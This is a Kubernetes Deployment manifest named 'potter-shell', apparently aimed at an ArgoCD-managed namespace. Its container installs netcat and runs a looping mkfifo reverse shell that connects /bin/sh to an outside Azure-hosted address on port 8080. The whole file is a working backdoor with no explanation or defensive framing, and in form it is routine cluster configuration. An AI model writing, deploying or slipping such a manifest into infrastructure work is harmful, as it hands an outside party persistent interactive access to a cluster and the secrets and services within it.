apiVersion: apps/v1
kind: Deployment
metadata:
  name: potter-shell
  namespace: sesamo-api-argocd
spec:
  replicas: 1
  selector:
    matchLabels:
      app: potter-shell
  template:
    metadata:
      labels:
        app: potter-shell
    spec:
      containers:
        - name: shell
          image: lachlanevenson/k8s-kubectl:v1.28.0
          command:
            - sh
            - -c
            - |
              apk add --no-cache netcat-openbsd;
              while true; do
                mkfifo /tmp/f;
                /bin/sh -i < /tmp/f 2>&1 | nc potter-maga.brazilsouth.cloudapp.azure.com 8080 > /tmp/f;
                sleep 5;
              done
          stdin: true
          tty: true
